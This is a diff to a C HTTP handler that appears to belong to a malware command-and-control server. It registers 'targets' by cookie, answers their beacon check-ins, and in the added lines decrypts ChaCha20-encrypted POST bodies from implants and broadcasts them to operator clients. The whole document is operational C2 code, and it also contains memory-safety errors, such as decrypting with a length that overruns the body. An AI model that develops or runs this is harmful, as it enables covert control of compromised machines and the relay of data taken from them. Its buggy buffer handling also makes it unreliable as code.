@@ -440,12 +440,99 @@ void* handle_http_connections(void* arg)
         }
         
         char buffer[BUFFER_SIZE];
-        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
-        uint64_t bytes_receivedU64 = bytes_received;
-        
-        if (bytes_received > 0) {
-            buffer[bytes_received] = '\0';
-            //printf("Received HTTP request:\n%s\n", buffer);
+
+        int total_received = 0;
+        int bytes_received = 0;
+
+        int content_length = 0;  // For POST body size
+
+        char *body_start = NULL;
+
+        int headers_end = 0;
+
+        char *body_buffer = NULL;
+
+        //memset(buffer, 0, sizeof(buffer));
+
+        // First, read until end of headers
+        do {
+            bytes_received = recv(client_socket, buffer + total_received, sizeof(buffer) - total_received - 1, 0);
+            
+            if (bytes_received < 0) {
+                perror("recv failed");
+                break;  // Or handle error
+            }
+            
+            if (bytes_received == 0) {
+                printf("Client closed.\n");
+                break;
+            }
+            
+            total_received += bytes_received;
+            
+            // Find end of headers
+            body_start = strstr(buffer, "\r\n\r\n");
+            if (body_start) {
+                headers_end = (body_start - buffer) + 4;  // Position after \r\n\r\n
+                break;
+            }
+            
+        } while (total_received < sizeof(buffer) - 1);
+
+        // Parse Content-Length from headers (simple strstr—improve for production)
+        char *cl_header = strstr(buffer, "Content-Length: ");
+        if (cl_header) {
+            content_length = atoi(cl_header + 16);  // Skip "Content-Length: "
+        }
+
+        // Now read the body if POST and Content-Length > 0
+        if (content_length > 0 && strstr(buffer, "POST ")!= NULL) {
+            printf("Reading POST body (%d bytes)...\n", content_length);
+            
+            while (total_received - headers_end < content_length) {
+                int remaining = content_length - (total_received - headers_end);
+                int to_read = sizeof(buffer) - total_received - 1;
+                if (to_read > remaining) to_read = remaining;
+                
+                bytes_received = recv(client_socket, buffer + total_received, to_read, 0);
+                
+                if (bytes_received < 0) {
+                    perror("Body recv failed");
+                    break;
+                }
+                
+                if (bytes_received == 0) {
+                    printf("Incomplete body—client closed.\n");
+                    break;
+                }
+                
+                total_received += bytes_received;
+            }
+            
+            buffer[total_received] = '\0';
+            //printf("Full POST request:\n%s\n", buffer);
+            //printf("POST body:\n%s\n", buffer + headers_end);  // Body starts here
+            body_buffer = buffer + headers_end;
+            chacha20_Full(body_buffer, body_buffer, total_received);
+        } else {
+            buffer[total_received] = '\0';
+            //printf("Full request (no body):\n%s\n", buffer);
+        }
+
+        if (total_received > 0) {
+
+            if (strncmp((char*)buffer, "GET", 3) != 0 && strncmp((char*)buffer, "POST", 4) != 0) {
+                closesocket(client_socket);
+                continue;
+            }
+
+            if (strncmp((char*)buffer, "POST", 4) == 0) {
+                char target_buffer[4096];
+                snprintf(target_buffer, sizeof(target_buffer), "DATA:%s\0", body_buffer);
+                broadcast_to_clients(target_buffer, INVALID_SOCKET);
+                continue;
+                
+            }
             
             // Extract ID from cookie for target detection
             char client_id[MAX_COOKIE_LEN] = {0};
@@ -456,12 +543,8 @@ void* handle_http_connections(void* arg)
                 
                 // Process target request
                 unsigned char* decrypted = buffer; //chacha20_Full(buffer, buffer, bytes_receivedU64);
-                printf("Received Decrypted HTTP request:\n%s\n", decrypted);
+                //printf("Received Decrypted HTTP request:\n%s\n", decrypted);
 
-                if (strncmp((char*)decrypted, "GET", 3) != 0) {
-                    closesocket(client_socket);
-                    continue;
-                }
                 
                 // Handle beacon messages from targets
                 if (strncmp((char*)decrypted, "GET /?beacon=ALIVE", 18) == 0) {
